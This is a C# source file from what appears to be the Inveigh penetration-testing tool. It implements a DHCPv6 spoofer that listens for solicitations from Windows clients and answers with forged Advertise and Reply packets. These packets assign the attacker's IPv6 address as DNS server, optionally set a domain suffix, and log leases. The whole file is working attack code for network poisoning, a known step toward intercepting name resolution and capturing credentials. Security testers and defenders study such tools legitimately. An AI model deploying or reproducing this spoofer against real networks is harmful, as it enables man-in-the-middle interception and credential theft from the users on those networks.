using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace Inveigh
{
    class DHCPv6
    {
        public static void DHCPv6Listener(string spooferIPv6, string snifferMAC, string dhcpv6DomainSuffix)
        {
            byte[] spooferIPv6Data = IPAddress.Parse(spooferIPv6).GetAddressBytes();
            IPEndPoint dhcpv6Endpoint = new IPEndPoint(IPAddress.IPv6Any, 547);
            UdpClient dhcpv6Client = new UdpClient(AddressFamily.InterNetworkV6);
            int dhcpv6IPIndex = 1;
            byte[] dhcpv6DomainSuffixData = Util.NewDNSNameArray(dhcpv6DomainSuffix);
            Random ipv6Random = new Random();
            int ipv6RandomValue = ipv6Random.Next(1, 9999);
            byte[] snifferMACArray = new byte[6];
            snifferMAC = snifferMAC.Insert(2, "-").Insert(5, "-").Insert(8, "-").Insert(11, "-").Insert(14, "-");
            int i = 0;

            foreach (string character in snifferMAC.Split('-'))
            {
                snifferMACArray[i] = Convert.ToByte(Convert.ToInt16(character, 16));
                i++;
            }

            try
            {
                dhcpv6Client.ExclusiveAddressUse = false;
                dhcpv6Client.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                dhcpv6Client.Client.Bind(dhcpv6Endpoint);
                dhcpv6Client.JoinMulticastGroup(IPAddress.Parse("ff02::1:2"));
            }
            catch
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[-] Error starting unprivileged DHCPv6 spoofer.", DateTime.Now.ToString("s")));
                }

                throw;
            }

            while (!Program.exitInveigh)
            {

                try
                {
                    byte[] udpPayload = dhcpv6Client.Receive(ref dhcpv6Endpoint);
                    int dhcpv6SourcePort = dhcpv6Endpoint.Port;
                    IPAddress sourceIPAddress = dhcpv6Endpoint.Address;
                    byte[] dhcpv6MessageTypeID = new byte[1];
                    Buffer.BlockCopy(udpPayload, 0, dhcpv6MessageTypeID, 0, 1);
                    byte[] dhcpv6TransactionID = new byte[3];
                    Buffer.BlockCopy(udpPayload, 1, dhcpv6TransactionID, 0, 3);
                    byte[] dhcpv6ClientIdentifier = new byte[18];
                    Buffer.BlockCopy(udpPayload, 10, dhcpv6ClientIdentifier, 0, 18);
                    byte[] dhcpv6ClientMACData = new byte[6];
                    Buffer.BlockCopy(udpPayload, 22, dhcpv6ClientMACData, 0, 6);
                    string dhcpv6ClientMAC = BitConverter.ToString(dhcpv6ClientMACData).Replace("-", ":");
                    byte[] dhcpv6IAID = new byte[4];

                    if ((int)dhcpv6MessageTypeID[0] == 1)
                    {
                        Buffer.BlockCopy(udpPayload, 32, dhcpv6IAID, 0, 4);
                    }
                    else
                    {
                        Buffer.BlockCopy(udpPayload, 46, dhcpv6IAID, 0, 4);
                    }

                    byte[] dhcpv6ClientIP = new byte[16];
                    string dhcpv6LeaseIP = "";
                    byte[] dhcpv6OptionData = new byte[2];
                    byte[] dhcpv6OptionLength = new byte[2];
                    string dhcpv6FQDN = "";
                    string dhcpv6MessageType = "";
                    string dhcpv6ResponseMessage = "";
                    string dhcpv6ResponseMessage2 = "";

                    if ((int)dhcpv6MessageTypeID[0] == 1 || (int)dhcpv6MessageTypeID[0] == 3 || (int)dhcpv6MessageTypeID[0] == 5)
                    {

                        for (i = 12; i < udpPayload.Length; i++)
                        {

                            if (Util.UInt16DataLength(i, udpPayload) == 39)
                            {
                                dhcpv6FQDN = Util.ParseNameQuery((i + 4), udpPayload);
                            }

                        }

                        int index = BitConverter.ToString(udpPayload).Replace("-", String.Empty).IndexOf("4D53465420352E30");

                        if (index >= 0 && Program.dhcpv6ClientTable.ContainsKey(dhcpv6ClientMAC))
                        {
                            dhcpv6LeaseIP = Program.dhcpv6ClientTable[dhcpv6ClientMAC].ToString();
                            dhcpv6ClientIP = IPAddress.Parse(dhcpv6LeaseIP).GetAddressBytes();
                        }
                        else if (index >= 0 && !Program.dhcpv6ClientTable.ContainsKey(dhcpv6ClientMAC))
                        {
                            dhcpv6LeaseIP = "fe80::" + ipv6RandomValue + ":" + dhcpv6IPIndex;
                            dhcpv6ClientIP = IPAddress.Parse(dhcpv6LeaseIP).GetAddressBytes();
                            Program.dhcpv6ClientTable.Add(dhcpv6ClientMAC, dhcpv6LeaseIP);
                            dhcpv6IPIndex++;

                            lock (Program.dhcpv6FileList)
                            {
                                Program.dhcpv6FileList.Add(dhcpv6ClientMAC + "," + dhcpv6LeaseIP);
                            }

                        }

                        if (Program.enabledDHCPv6)
                        {

                            if (index > 0)
                            {

                                using (MemoryStream ms = new MemoryStream())
                                {

                                    if ((int)dhcpv6MessageTypeID[0] == 1)
                                    {
                                        ms.Write((new byte[1] { 0x02 }), 0, 1);
                                    }
                                    else if ((int)dhcpv6MessageTypeID[0] == 3)
                                    {
                                        ms.Write((new byte[1] { 0x07 }), 0, 1);
                                    }
                                    else if ((int)dhcpv6MessageTypeID[0] == 5)
                                    {
                                        ms.Write((new byte[1] { 0x07 }), 0, 1);
                                    }

                                    ms.Write(dhcpv6TransactionID, 0, dhcpv6TransactionID.Length);
                                    ms.Write(dhcpv6ClientIdentifier, 0, dhcpv6ClientIdentifier.Length);
                                    ms.Write((new byte[4] { 0x00, 0x02, 0x00, 0x0a }), 0, 4);
                                    ms.Write((new byte[4] { 0x00, 0x03, 0x00, 0x01 }), 0, 4);
                                    ms.Write(snifferMACArray, 0, snifferMACArray.Length);
                                    ms.Write((new byte[4] { 0x00, 0x17, 0x00, 0x10 }), 0, 4);
                                    ms.Write(spooferIPv6Data, 0, spooferIPv6Data.Length);

                                    if (!String.IsNullOrEmpty(dhcpv6DomainSuffix))
                                    {
                                        ms.Write((new byte[2] { 0x00, 0x18 }), 0, 2);
                                        ms.Write(Util.IntToByteArray2(dhcpv6DomainSuffixData.Length), 0, 2);
                                        ms.Write(dhcpv6DomainSuffixData, 0, dhcpv6DomainSuffixData.Length);
                                    }

                                    ms.Write((new byte[4] { 0x00, 0x03, 0x00, 0x28 }), 0, 4);
                                    ms.Write(dhcpv6IAID, 0, dhcpv6IAID.Length);
                                    ms.Write((new byte[12] { 0x00, 0x00, 0x00, 0xc8, 0x00, 0x00, 0x00, 0xfa, 0x00, 0x05, 0x00, 0x18 }), 0, 12);
                                    ms.Write(dhcpv6ClientIP, 0, dhcpv6ClientIP.Length);
                                    ms.Write((new byte[8] { 0x00, 0x00, 0x01, 0x2c, 0x00, 0x00, 0x01, 0x2c }), 0, 8);
                                    IPEndPoint dnsDestinationEndPoint = new IPEndPoint(sourceIPAddress, 546);
                                    dhcpv6Client.Connect(dnsDestinationEndPoint);
                                    dhcpv6Client.Send(ms.ToArray(), ms.ToArray().Length);
                                    dhcpv6Client.Close();
                                    dhcpv6Endpoint = new IPEndPoint(IPAddress.IPv6Any, 547);
                                    dhcpv6Client = new UdpClient(AddressFamily.InterNetworkV6);
                                    dhcpv6Client.ExclusiveAddressUse = false;
                                    dhcpv6Client.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                                    dhcpv6Client.Client.Bind(dhcpv6Endpoint);
                                    dhcpv6Client.JoinMulticastGroup(IPAddress.Parse("ff02::1:2"));
                                }

                            }

                        }

                        if (!Program.enabledDHCPv6 && (int)dhcpv6MessageTypeID[0] == 1)
                        {
                            dhcpv6MessageType = "solicitation";
                            dhcpv6ResponseMessage = "spoofer disabled";
                        }
                        else if (index < 0)
                        {
                            dhcpv6MessageType = "solicitation";
                            dhcpv6ResponseMessage = "vendor ignored";
                        }
                        else if ((int)dhcpv6MessageTypeID[0] == 1)
                        {
                            dhcpv6MessageType = "solicitation";
                            dhcpv6ResponseMessage = "response sent";
                            dhcpv6ResponseMessage2 = "advertised";
                        }
                        else if ((int)dhcpv6MessageTypeID[0] == 3)
                        {
                            dhcpv6MessageType = "request";
                            dhcpv6ResponseMessage = "response sent";
                            dhcpv6ResponseMessage2 = "leased";
                        }
                        else if ((int)dhcpv6MessageTypeID[0] == 5)
                        {
                            dhcpv6MessageType = "renew";
                            dhcpv6ResponseMessage = "response sent";
                            dhcpv6ResponseMessage2 = "renewed";
                        }

                        lock (Program.outputList)
                        {

                            if (!String.IsNullOrEmpty(dhcpv6FQDN))
                            {
                                Program.outputList.Add(String.Format("[+] [{0}] DHCPv6 {1} from {2}({3}) [{4}]", DateTime.Now.ToString("s"), dhcpv6MessageType, sourceIPAddress, dhcpv6FQDN, dhcpv6ResponseMessage));
                            }
                            else
                            {
                                Program.outputList.Add(String.Format("[+] [{0}] DHCPv6 {1} from {2} [{3}]", DateTime.Now.ToString("s"), dhcpv6MessageType, sourceIPAddress, dhcpv6ResponseMessage));
                            }

                            if (String.Equals(dhcpv6ResponseMessage, "response sent"))
                            {
                                Program.outputList.Add(String.Format("[+] [{0}] DHCPv6 {1} {2} to {3}", DateTime.Now.ToString("s"), dhcpv6LeaseIP, dhcpv6ResponseMessage2, dhcpv6ClientMAC));
                            }

                        }

                    }

                }
                catch (Exception ex)
                {
                    Program.outputList.Add(String.Format("[-] [{0}] DHCPv6 spoofer error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }

            }

        }

    }
}
